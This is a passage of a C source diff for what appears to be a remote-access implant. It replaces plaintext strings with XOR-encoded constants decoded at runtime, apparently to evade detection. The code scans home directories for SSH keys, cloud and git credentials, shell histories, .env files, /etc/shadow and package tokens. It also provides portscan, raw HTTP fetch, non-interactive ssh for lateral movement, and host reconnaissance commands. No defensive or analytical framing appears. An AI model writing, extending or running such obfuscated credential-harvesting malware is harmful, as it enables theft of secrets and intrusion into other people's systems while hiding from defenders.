+    char s_sshd[ENC_LX_SSH_DOTDIR_LEN + 1]; xor_dec(s_sshd, ENC_LX_SSH_DOTDIR, ENC_LX_SSH_DOTDIR_LEN);
+    char s_sshd2[ENC_LX_SSH_DOTDIR2_LEN + 1]; xor_dec(s_sshd2, ENC_LX_SSH_DOTDIR2, ENC_LX_SSH_DOTDIR2_LEN);
+    char s_pem[ENC_LX_EXT_PEM_LEN + 1]; xor_dec(s_pem, ENC_LX_EXT_PEM, ENC_LX_EXT_PEM_LEN);
+    char s_key[ENC_LX_EXT_KEY_LEN + 1]; xor_dec(s_key, ENC_LX_EXT_KEY, ENC_LX_EXT_KEY_LEN);
+
+    if (strstr(path, s_sshd) || strstr(path, s_sshd2))
+        if (strstr(base, s_pem) || strstr(base, s_key)) return 0;
 
     /* Cloud */
-    if (strstr(path, ".aws/credentials") || strstr(path, "/.boto") ||
-        strstr(path, ".kube/config") || strstr(path, ".docker/config.json"))
+    char s_aws[ENC_LX_AWS_CRED_LEN + 1]; xor_dec(s_aws, ENC_LX_AWS_CRED, ENC_LX_AWS_CRED_LEN);
+    char s_boto[ENC_LX_BOTO_LEN + 1]; xor_dec(s_boto, ENC_LX_BOTO, ENC_LX_BOTO_LEN);
+    char s_kube[ENC_LX_KUBE_CONFIG_LEN + 1]; xor_dec(s_kube, ENC_LX_KUBE_CONFIG, ENC_LX_KUBE_CONFIG_LEN);
+    char s_dock[ENC_LX_DOCKER_CONFIG_LEN + 1]; xor_dec(s_dock, ENC_LX_DOCKER_CONFIG, ENC_LX_DOCKER_CONFIG_LEN);
+
+    if (strstr(path, s_aws) || strstr(path, s_boto) ||
+        strstr(path, s_kube) || strstr(path, s_dock))
         return 1;
 
     /* Git */
-    if (strcmp(base, ".gitconfig") == 0 || strcmp(base, ".git-credentials") == 0)
+    char s_gitc[ENC_LX_GITCONFIG_LEN + 1]; xor_dec(s_gitc, ENC_LX_GITCONFIG, ENC_LX_GITCONFIG_LEN);
+    char s_gitcr[ENC_LX_GIT_CREDS_LEN + 1]; xor_dec(s_gitcr, ENC_LX_GIT_CREDS, ENC_LX_GIT_CREDS_LEN);
+
+    if (strcmp(base, s_gitc) == 0 || strcmp(base, s_gitcr) == 0)
         return 2;
 
     /* History */
-    if (strcmp(base, ".bash_history") == 0 || strcmp(base, ".zsh_history") == 0 ||
-        strcmp(base, ".sh_history") == 0 || strcmp(base, ".fish_history") == 0)
+    char s_bh[ENC_LX_BASH_HISTORY_LEN + 1]; xor_dec(s_bh, ENC_LX_BASH_HISTORY, ENC_LX_BASH_HISTORY_LEN);
+    char s_zh[ENC_LX_ZSH_HISTORY_LEN + 1]; xor_dec(s_zh, ENC_LX_ZSH_HISTORY, ENC_LX_ZSH_HISTORY_LEN);
+    char s_shh[ENC_LX_SH_HISTORY_LEN + 1]; xor_dec(s_shh, ENC_LX_SH_HISTORY, ENC_LX_SH_HISTORY_LEN);
+    char s_fh[ENC_LX_FISH_HISTORY_LEN + 1]; xor_dec(s_fh, ENC_LX_FISH_HISTORY, ENC_LX_FISH_HISTORY_LEN);
+
+    if (strcmp(base, s_bh) == 0 || strcmp(base, s_zh) == 0 ||
+        strcmp(base, s_shh) == 0 || strcmp(base, s_fh) == 0)
         return 3;
 
     /* Env */
-    if (strcmp(base, ".env") == 0) return 4;
+    char s_env[ENC_LX_DOT_ENV_LEN + 1]; xor_dec(s_env, ENC_LX_DOT_ENV, ENC_LX_DOT_ENV_LEN);
+    if (strcmp(base, s_env) == 0) return 4;
     {
         size_t blen = strlen(base);
-        if (blen > 4 && strcmp(base + blen - 4, ".env") == 0) return 4;
+        if (blen > 4 && strcmp(base + blen - 4, s_env) == 0) return 4;
     }
 
     /* Databases */
     {
+        char s_sql[ENC_LX_EXT_SQL_LEN + 1]; xor_dec(s_sql, ENC_LX_EXT_SQL, ENC_LX_EXT_SQL_LEN);
+        char s_db[ENC_LX_EXT_DB_LEN + 1]; xor_dec(s_db, ENC_LX_EXT_DB, ENC_LX_EXT_DB_LEN);
+        char s_sqlite[ENC_LX_EXT_SQLITE_LEN + 1]; xor_dec(s_sqlite, ENC_LX_EXT_SQLITE, ENC_LX_EXT_SQLITE_LEN);
+        char s_sqlite3[ENC_LX_EXT_SQLITE3_LEN + 1]; xor_dec(s_sqlite3, ENC_LX_EXT_SQLITE3, ENC_LX_EXT_SQLITE3_LEN);
+
         size_t blen = strlen(base);
-        if (blen > 4 && (strcmp(base + blen - 4, ".sql") == 0 ||
-                          strcmp(base + blen - 3, ".db") == 0))  return 5;
-        if (blen > 7 && strcmp(base + blen - 7, ".sqlite") == 0) return 5;
-        if (blen > 8 && strcmp(base + blen - 8, ".sqlite3") == 0) return 5;
+        if (blen > 4 && (strcmp(base + blen - 4, s_sql) == 0 ||
+                          strcmp(base + blen - 3, s_db) == 0))  return 5;
+        if (blen > 7 && strcmp(base + blen - 7, s_sqlite) == 0) return 5;
+        if (blen > 8 && strcmp(base + blen - 8, s_sqlite3) == 0) return 5;
     }
 
     /* Certificates */
     {
+        char s_crt[ENC_LX_EXT_CRT_LEN + 1]; xor_dec(s_crt, ENC_LX_EXT_CRT, ENC_LX_EXT_CRT_LEN);
+        char s_p12[ENC_LX_EXT_P12_LEN + 1]; xor_dec(s_p12, ENC_LX_EXT_P12, ENC_LX_EXT_P12_LEN);
+        char s_pfx[ENC_LX_EXT_PFX_LEN + 1]; xor_dec(s_pfx, ENC_LX_EXT_PFX, ENC_LX_EXT_PFX_LEN);
+
         size_t blen = strlen(base);
-        if (blen > 4 && (strcmp(base + blen - 4, ".crt") == 0 ||
-                          strcmp(base + blen - 4, ".p12") == 0 ||
-                          strcmp(base + blen - 4, ".pfx") == 0)) return 6;
+        if (blen > 4 && (strcmp(base + blen - 4, s_crt) == 0 ||
+                          strcmp(base + blen - 4, s_p12) == 0 ||
+                          strcmp(base + blen - 4, s_pfx) == 0)) return 6;
     }
 
     /* Passwords */
-    if (strstr(path, "/etc/shadow") || strcmp(base, ".htpasswd") == 0) return 7;
+    char s_shadow[ENC_LX_ETC_SHADOW_LEN + 1]; xor_dec(s_shadow, ENC_LX_ETC_SHADOW, ENC_LX_ETC_SHADOW_LEN);
+    char s_htpw[ENC_LX_HTPASSWD_LEN + 1]; xor_dec(s_htpw, ENC_LX_HTPASSWD, ENC_LX_HTPASSWD_LEN);
+    if (strstr(path, s_shadow) || strcmp(base, s_htpw) == 0) return 7;
 
     /* Tokens */
-    if (strcmp(base, ".npmrc") == 0 || strcmp(base, ".pypirc") == 0 ||
-        strcmp(base, ".netrc") == 0) return 8;
+    char s_npm[ENC_LX_NPMRC_LEN + 1]; xor_dec(s_npm, ENC_LX_NPMRC, ENC_LX_NPMRC_LEN);
+    char s_pypi[ENC_LX_PYPIRC_LEN + 1]; xor_dec(s_pypi, ENC_LX_PYPIRC, ENC_LX_PYPIRC_LEN);
+    char s_netrc[ENC_LX_NETRC_LEN + 1]; xor_dec(s_netrc, ENC_LX_NETRC, ENC_LX_NETRC_LEN);
+    if (strcmp(base, s_npm) == 0 || strcmp(base, s_pypi) == 0 ||
+        strcmp(base, s_netrc) == 0) return 8;
 
     return -1;
 }
 
 static int triage_skip_dir(const char *path) {
-    return (strncmp(path, "/proc", 5) == 0 || strncmp(path, "/sys", 4) == 0 ||
-            strncmp(path, "/dev", 4) == 0  || strncmp(path, "/run", 4) == 0);
+    char s_proc[ENC_LX_PROC_LEN + 1]; xor_dec(s_proc, ENC_LX_PROC, ENC_LX_PROC_LEN);
+    char s_sys[ENC_LX_SYS_LEN + 1];   xor_dec(s_sys, ENC_LX_SYS, ENC_LX_SYS_LEN);
+    char s_dev[ENC_LX_DEV_LEN + 1];   xor_dec(s_dev, ENC_LX_DEV, ENC_LX_DEV_LEN);
+    char s_run[ENC_LX_RUN_LEN + 1];   xor_dec(s_run, ENC_LX_RUN, ENC_LX_RUN_LEN);
+
+    return (strncmp(path, s_proc, ENC_LX_PROC_LEN) == 0 ||
+            strncmp(path, s_sys,  ENC_LX_SYS_LEN) == 0  ||
+            strncmp(path, s_dev,  ENC_LX_DEV_LEN) == 0   ||
+            strncmp(path, s_run,  ENC_LX_RUN_LEN) == 0);
 }
 
 static void triage_add_hit(const char *fpath, const struct stat *sb) {
@@ -1488,11 +1773,28 @@ static int builtin_triage(const char *args, char *buf, int buf_size) {
     g_triage_cap   = 0;
 
     if (*target == '\0') {
-        triage_walk("/home", 0);
-        triage_walk("/root", 0);
+        char home_path[ENC_LX_HOME_LEN + 1];
+        xor_dec(home_path, ENC_LX_HOME, ENC_LX_HOME_LEN);
+        char root_path[ENC_LX_ROOT_LEN + 1];
+        xor_dec(root_path, ENC_LX_ROOT, ENC_LX_ROOT_LEN);
+        triage_walk(home_path, 0);
+        triage_walk(root_path, 0);
     } else {
         triage_walk(target, 0);
     }
+
+    /* decode category names */
+    char cat_names[TRIAGE_CATS][32];
+    xor_dec(cat_names[0], ENC_LX_TCAT_SSHKEYS, ENC_LX_TCAT_SSHKEYS_LEN);
+    xor_dec(cat_names[1], ENC_LX_TCAT_CLOUD,   ENC_LX_TCAT_CLOUD_LEN);
+    xor_dec(cat_names[2], ENC_LX_TCAT_GIT,     ENC_LX_TCAT_GIT_LEN);
+    xor_dec(cat_names[3], ENC_LX_TCAT_HISTORY,  ENC_LX_TCAT_HISTORY_LEN);
+    xor_dec(cat_names[4], ENC_LX_TCAT_ENV,      ENC_LX_TCAT_ENV_LEN);
+    xor_dec(cat_names[5], ENC_LX_TCAT_DB,       ENC_LX_TCAT_DB_LEN);
+    xor_dec(cat_names[6], ENC_LX_TCAT_CERTS,    ENC_LX_TCAT_CERTS_LEN);
+    xor_dec(cat_names[7], ENC_LX_TCAT_PASS,     ENC_LX_TCAT_PASS_LEN);
+    xor_dec(cat_names[8], ENC_LX_TCAT_TOKENS,   ENC_LX_TCAT_TOKENS_LEN);
+    xor_dec(cat_names[9], ENC_LX_TCAT_MISC,     ENC_LX_TCAT_MISC_LEN);
 
     int cats_seen = 0;
     for (int c = 0; c < TRIAGE_CATS; c++) {
@@ -1500,7 +1802,7 @@ static int builtin_triage(const char *args, char *buf, int buf_size) {
         for (int i = 0; i < g_triage_count; i++) {
             if (g_triage_hits[i].cat != c) continue;
             if (first) {
-                pos = out_append(buf, buf_size, pos, "[%s]\n", triage_cat_names[c]);
+                pos = out_append(buf, buf_size, pos, "[%s]\n", cat_names[c]);
                 first = 0;
                 cats_seen++;
             }
@@ -1516,9 +1818,9 @@ static int builtin_triage(const char *args, char *buf, int buf_size) {
         }
     }
 
-    pos = out_append(buf, buf_size, pos,
-                     "\nFound %d sensitive file(s) in %d category/categories\n",
-                     g_triage_count, cats_seen);
+    char found_fmt[ENC_LX_TRIAGE_FOUND_LEN + 1];
+    xor_dec(found_fmt, ENC_LX_TRIAGE_FOUND, ENC_LX_TRIAGE_FOUND_LEN);
+    pos = out_append(buf, buf_size, pos, found_fmt, g_triage_count, cats_seen);
 
     free(g_triage_hits);
     g_triage_hits  = NULL;
@@ -1533,19 +1835,29 @@ static int builtin_triage(const char *args, char *buf, int buf_size) {
 static int builtin_curl(const char *args, char *buf, int buf_size) {
     int pos = 0;
     const char *url = ltrim(args);
-    if (*url == '\0')
-        return out_append(buf, buf_size, 0, "usage: curl <url>\n");
+    if (*url == '\0') {
+        char fmt[ENC_LX_USAGE_CURL_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_CURL, ENC_LX_USAGE_CURL_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     /* Check scheme */
-    if (strncmp(url, "https://", 8) == 0)
-        return out_append(buf, buf_size, 0,
-                          "curl: https not supported in builtin, use download\n");
+    char https_pfx[ENC_LX_HTTPS_PREFIX_LEN + 1];
+    xor_dec(https_pfx, ENC_LX_HTTPS_PREFIX, ENC_LX_HTTPS_PREFIX_LEN);
+    char http_pfx[ENC_LX_HTTP_PREFIX_LEN + 1];
+    xor_dec(http_pfx, ENC_LX_HTTP_PREFIX, ENC_LX_HTTP_PREFIX_LEN);
+
+    if (strncmp(url, https_pfx, ENC_LX_HTTPS_PREFIX_LEN) == 0) {
+        char fmt[ENC_LX_CURL_NO_HTTPS_LEN + 1];
+        xor_dec(fmt, ENC_LX_CURL_NO_HTTPS, ENC_LX_CURL_NO_HTTPS_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     const char *host_start;
-    if (strncmp(url, "http://", 7) == 0) host_start = url + 7;
+    if (strncmp(url, http_pfx, ENC_LX_HTTP_PREFIX_LEN) == 0)
+        host_start = url + ENC_LX_HTTP_PREFIX_LEN;
     else host_start = url;
 
-    /* extract host, port, path */
     char host[256] = {0};
     int  port = 80;
     char path[2048] = "/";
@@ -1554,7 +1866,6 @@ static int builtin_curl(const char *args, char *buf, int buf_size) {
     const char *colon = strchr(host_start, ':');
 
     if (colon && (!slash || colon < slash)) {
-        /* port specified */
         int hlen = (int)(colon - host_start);
         if (hlen >= (int)sizeof(host)) hlen = (int)sizeof(host) - 1;
         memcpy(host, host_start, (size_t)hlen);
@@ -1570,29 +1881,34 @@ static int builtin_curl(const char *args, char *buf, int buf_size) {
     } else {
         strncpy(host, host_start, sizeof(host) - 1);
     }
-    if (host[0] == '\0')
-        return out_append(buf, buf_size, 0, "curl: invalid URL\n");
+    if (host[0] == '\0') {
+        char fmt[ENC_LX_CURL_INVAL_URL_LEN + 1];
+        xor_dec(fmt, ENC_LX_CURL_INVAL_URL, ENC_LX_CURL_INVAL_URL_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
-    /* resolve host */
     struct in_addr addr;
     if (inet_aton(host, &addr) == 0) {
-        /* not a numeric IP — try getaddrinfo */
         struct addrinfo hints, *res = NULL;
         memset(&hints, 0, sizeof(hints));
         hints.ai_family   = AF_INET;
         hints.ai_socktype = SOCK_STREAM;
-        if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res)
-            return out_append(buf, buf_size, 0,
-                              "curl: cannot resolve '%s'\n", host);
+        if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) {
+            char fmt[ENC_LX_CURL_RESOLVE_LEN + 1];
+            xor_dec(fmt, ENC_LX_CURL_RESOLVE, ENC_LX_CURL_RESOLVE_LEN);
+            return out_append(buf, buf_size, 0, fmt, host);
+        }
         addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
         freeaddrinfo(res);
     }
 
     int fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (fd < 0)
-        return out_append(buf, buf_size, 0, "curl: socket: %s\n", strerror(errno));
+    if (fd < 0) {
+        char fmt[ENC_LX_CURL_SOCKET_LEN + 1];
+        xor_dec(fmt, ENC_LX_CURL_SOCKET, ENC_LX_CURL_SOCKET_LEN);
+        return out_append(buf, buf_size, 0, fmt, strerror(errno));
+    }
 
-    /* 10s timeout */
     struct timeval tv = { 10, 0 };
     setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
@@ -1605,20 +1921,23 @@ static int builtin_curl(const char *args, char *buf, int buf_size) {
 
     if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
         close(fd);
-        return out_append(buf, buf_size, 0,
-                          "curl: connect %s:%d: %s\n", host, port, strerror(errno));
+        char fmt[ENC_LX_CURL_CONNECT_LEN + 1];
+        xor_dec(fmt, ENC_LX_CURL_CONNECT, ENC_LX_CURL_CONNECT_LEN);
+        return out_append(buf, buf_size, 0, fmt, host, port, strerror(errno));
     }
 
     /* send HTTP request */
+    char req_fmt[ENC_LX_HTTP_GET_REQ_LEN + 1];
+    xor_dec(req_fmt, ENC_LX_HTTP_GET_REQ, ENC_LX_HTTP_GET_REQ_LEN);
     char req[1024];
-    int req_len = snprintf(req, sizeof(req),
-        "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
+    int req_len = snprintf(req, sizeof(req), req_fmt, path, host);
     if (write(fd, req, (size_t)req_len) != req_len) {
         close(fd);
-        return out_append(buf, buf_size, 0, "curl: send error: %s\n", strerror(errno));
+        char fmt[ENC_LX_CURL_SEND_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_CURL_SEND_ERR, ENC_LX_CURL_SEND_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, strerror(errno));
     }
 
-    /* read response */
     char rbuf[4096];
     ssize_t n;
     while ((n = read(fd, rbuf, sizeof(rbuf))) > 0) {
@@ -1639,11 +1958,12 @@ static int builtin_curl(const char *args, char *buf, int buf_size) {
 static int builtin_ssh(const char *args, char *buf, int buf_size) {
     int pos = 0;
     const char *p = ltrim(args);
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0,
-                          "usage: ssh user@host [command]\n");
+    if (*p == '\0') {
+        char fmt[ENC_LX_USAGE_SSH_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_SSH, ENC_LX_USAGE_SSH_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
-    /* first token is user@host, rest is command */
     const char *sp = strchr(p, ' ');
     char target[256] = {0};
     const char *remote_cmd = NULL;
@@ -1657,26 +1977,42 @@ static int builtin_ssh(const char *args, char *buf, int buf_size) {
         strncpy(target, p, sizeof(target) - 1);
     }
 
-    /* build argv */
+    /* decode ssh argv strings */
+    char ssh_cmd[ENC_LX_SSH_CMD_LEN + 1];
+    xor_dec(ssh_cmd, ENC_LX_SSH_CMD, ENC_LX_SSH_CMD_LEN);
+    char ssh_o[ENC_LX_SSH_OPT_O_LEN + 1];
+    xor_dec(ssh_o, ENC_LX_SSH_OPT_O, ENC_LX_SSH_OPT_O_LEN);
+    char ssh_strict[ENC_LX_SSH_STRICTHOST_LEN + 1];
+    xor_dec(ssh_strict, ENC_LX_SSH_STRICTHOST, ENC_LX_SSH_STRICTHOST_LEN);
+    char ssh_batch[ENC_LX_SSH_BATCH_LEN + 1];
+    xor_dec(ssh_batch, ENC_LX_SSH_BATCH, ENC_LX_SSH_BATCH_LEN);
+    char ssh_timeout[ENC_LX_SSH_TIMEOUT_LEN + 1];
+    xor_dec(ssh_timeout, ENC_LX_SSH_TIMEOUT, ENC_LX_SSH_TIMEOUT_LEN);
+
     const char *argv_arr[16];
     int ai = 0;
-    argv_arr[ai++] = "ssh";
-    argv_arr[ai++] = "-o"; argv_arr[ai++] = "StrictHostKeyChecking=no";
-    argv_arr[ai++] = "-o"; argv_arr[ai++] = "BatchMode=yes";
-    argv_arr[ai++] = "-o"; argv_arr[ai++] = "ConnectTimeout=10";
+    argv_arr[ai++] = ssh_cmd;
+    argv_arr[ai++] = ssh_o;  argv_arr[ai++] = ssh_strict;
+    argv_arr[ai++] = ssh_o;  argv_arr[ai++] = ssh_batch;
+    argv_arr[ai++] = ssh_o;  argv_arr[ai++] = ssh_timeout;
     argv_arr[ai++] = target;
     if (remote_cmd && *remote_cmd)
         argv_arr[ai++] = remote_cmd;
     argv_arr[ai] = NULL;
 
     int pipefd[2];
-    if (pipe(pipefd) < 0)
-        return out_append(buf, buf_size, 0, "ssh: pipe: %s\n", strerror(errno));
+    if (pipe(pipefd) < 0) {
+        char fmt[ENC_LX_SSH_PIPE_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_SSH_PIPE_ERR, ENC_LX_SSH_PIPE_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, strerror(errno));
+    }
 
     pid_t pid = fork();
     if (pid < 0) {
         close(pipefd[0]); close(pipefd[1]);
-        return out_append(buf, buf_size, 0, "ssh: fork: %s\n", strerror(errno));
+        char fmt[ENC_LX_SSH_FORK_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_SSH_FORK_ERR, ENC_LX_SSH_FORK_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, strerror(errno));
     }
 
     if (pid == 0) {
@@ -1684,13 +2020,12 @@ static int builtin_ssh(const char *args, char *buf, int buf_size) {
         dup2(pipefd[1], STDOUT_FILENO);
         dup2(pipefd[1], STDERR_FILENO);
         close(pipefd[1]);
-        execvp("ssh", (char *const *)argv_arr);
+        execvp(ssh_cmd, (char *const *)argv_arr);
         _exit(127);
     }
 
     close(pipefd[1]);
 
-    /* read output with 30s timeout */
     fd_set rfds;
     struct timeval deadline = { 30, 0 };
     ssize_t n;
@@ -1721,78 +2056,103 @@ int builtin_dispatch(const char *cmd, char *out_buf, int buf_size) {
     if (buf_size > 0) out_buf[0] = '\0';
 
     /* --- exact-match builtins --- */
-
-    /* XOR: replace with xor_eq */
-    if (strcmp(cmd, "whoami") == 0 || strcmp(cmd, "id") == 0) {
+    if (xor_eq(cmd, ENC_CMD_WHOAMI, ENC_CMD_WHOAMI_LEN) ||
+        xor_eq(cmd, ENC_CMD_ID, ENC_CMD_ID_LEN)) {
         builtin_whoami(out_buf, buf_size);
         return 1;
     }
-    if (strcmp(cmd, "hostname") == 0) { /* XOR: replace with xor_eq */
+    if (xor_eq(cmd, ENC_CMD_HOSTNAME, ENC_CMD_HOSTNAME_LEN)) {
         builtin_hostname(out_buf, buf_size);
         return 1;
     }
-    if (strcmp(cmd, "pwd") == 0) { /* XOR: replace with xor_eq */
+    if (xor_eq(cmd, ENC_CMD_PWD, ENC_CMD_PWD_LEN)) {
         builtin_pwd(out_buf, buf_size);
         return 1;
     }
-    if (strcmp(cmd, "env") == 0) { /* XOR: replace with xor_eq */
+    if (xor_eq(cmd, ENC_CMD_ENV, ENC_CMD_ENV_LEN)) {
         builtin_env(out_buf, buf_size);
         return 1;
     }
-    if (strcmp(cmd, "ps") == 0) { /* XOR: replace with xor_eq */
+    if (xor_eq(cmd, ENC_CMD_PS, ENC_CMD_PS_LEN)) {
         builtin_ps(out_buf, buf_size);
         return 1;
     }
-    if (strcmp(cmd, "ipconfig") == 0 || strcmp(cmd, "ifconfig") == 0) { /* XOR: replace with xor_eq */
+    if (xor_eq(cmd, ENC_CMD_IPCONFIG, ENC_CMD_IPCONFIG_LEN) ||
+        xor_eq(cmd, ENC_CMD_IFCONFIG, ENC_CMD_IFCONFIG_LEN)) {
         builtin_ifconfig(out_buf, buf_size);
         return 1;
     }
-    if (strcmp(cmd, "netstat") == 0) { /* XOR: replace with xor_eq */
+    if (xor_eq(cmd, ENC_CMD_NETSTAT, ENC_CMD_NETSTAT_LEN)) {
         builtin_netstat(out_buf, buf_size);
         return 1;
     }
-    if (strcmp(cmd, "triagedirectory") == 0) { /* XOR: replace with xor_eq */
+    if (xor_eq(cmd, ENC_CMD_TRIAGE, ENC_CMD_TRIAGE_LEN)) {
         builtin_triage("", out_buf, buf_size);
         return 1;
     }
 
     /* --- ls (exact + prefix) --- */
-    /* XOR: replace with xor_eq / xor_prefix */
-    if (strcmp(cmd, "ls") == 0) {
+    if (xor_eq(cmd, ENC_CMD_LS_BARE, ENC_CMD_LS_BARE_LEN)) {
         builtin_ls("", out_buf, buf_size);
         return 1;
     }
-    if (strncmp(cmd, "ls ", 3) == 0) {
-        builtin_ls(cmd + 3, out_buf, buf_size);
+    if (xor_prefix(cmd, ENC_CMD_LS_SP, ENC_CMD_LS_SP_LEN)) {
+        builtin_ls(cmd + ENC_CMD_LS_SP_LEN, out_buf, buf_size);
         return 1;
     }
 
     /* --- filebrowser (exact + prefix) --- */
-    if (strcmp(cmd, "filebrowser") == 0) {
+    if (xor_eq(cmd, ENC_CMD_FILEBROWSER_BARE, ENC_CMD_FILEBROWSER_BARE_LEN)) {
         builtin_filebrowser("", out_buf, buf_size);
         return 1;
     }
-    if (strncmp(cmd, "filebrowser ", 12) == 0) {
-        builtin_filebrowser(cmd + 12, out_buf, buf_size);
+    if (xor_prefix(cmd, ENC_CMD_FILEBROWSER, ENC_CMD_FILEBROWSER_LEN)) {
+        builtin_filebrowser(cmd + ENC_CMD_FILEBROWSER_LEN, out_buf, buf_size);
         return 1;
     }
 
     /* --- prefix-match builtins --- */
-    if (strcmp(cmd, "cd") == 0) { builtin_cd("", out_buf, buf_size); return 1; }
-    if (strncmp(cmd, "cd ", 3) == 0) { builtin_cd(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "cat ", 4) == 0) { builtin_cat(cmd + 4, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "mkdir ", 6) == 0) { builtin_mkdir(cmd + 6, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "rm ", 3) == 0) { builtin_rm(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "cp ", 3) == 0) { builtin_cp(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "mv ", 3) == 0) { builtin_mv(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "chmod ", 6) == 0) { builtin_chmod(cmd + 6, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "getenv ", 7) == 0) { builtin_getenv(cmd + 7, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "kill ", 5) == 0) { builtin_kill_cmd(cmd + 5, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "portscan ", 9) == 0) { builtin_portscan(cmd + 9, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "curl ", 5) == 0) { builtin_curl(cmd + 5, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "ssh ", 4) == 0) { builtin_ssh(cmd + 4, out_buf, buf_size); return 1; } /* XOR */
-    if (strncmp(cmd, "triagedirectory ", 16) == 0) {
-        builtin_triage(cmd + 16, out_buf, buf_size);
+    if (xor_eq(cmd, ENC_CMD_CD_BARE, ENC_CMD_CD_BARE_LEN)) {
+        builtin_cd("", out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_CD_SP, ENC_CMD_CD_SP_LEN)) {
+        builtin_cd(cmd + ENC_CMD_CD_SP_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_CAT, ENC_CMD_CAT_LEN)) {
+        builtin_cat(cmd + ENC_CMD_CAT_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_MKDIR, ENC_CMD_MKDIR_LEN)) {
+        builtin_mkdir(cmd + ENC_CMD_MKDIR_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_RM, ENC_CMD_RM_LEN)) {
+        builtin_rm(cmd + ENC_CMD_RM_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_CP, ENC_CMD_CP_LEN)) {
+        builtin_cp(cmd + ENC_CMD_CP_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_MV, ENC_CMD_MV_LEN)) {
+        builtin_mv(cmd + ENC_CMD_MV_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_CHMOD, ENC_CMD_CHMOD_LEN)) {
+        builtin_chmod(cmd + ENC_CMD_CHMOD_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_GETENV, ENC_CMD_GETENV_LEN)) {
+        builtin_getenv(cmd + ENC_CMD_GETENV_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_KILL, ENC_CMD_KILL_LEN)) {
+        builtin_kill_cmd(cmd + ENC_CMD_KILL_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_PORTSCAN, ENC_CMD_PORTSCAN_LEN)) {
+        builtin_portscan(cmd + ENC_CMD_PORTSCAN_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_CURL, ENC_CMD_CURL_LEN)) {
+        builtin_curl(cmd + ENC_CMD_CURL_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_SSH, ENC_CMD_SSH_LEN)) {
+        builtin_ssh(cmd + ENC_CMD_SSH_LEN, out_buf, buf_size); return 1;
+    }
+    if (xor_prefix(cmd, ENC_CMD_TRIAGE_SP, ENC_CMD_TRIAGE_SP_LEN)) {
+        builtin_triage(cmd + ENC_CMD_TRIAGE_SP_LEN, out_buf, buf_size);
         return 1;
     }
 
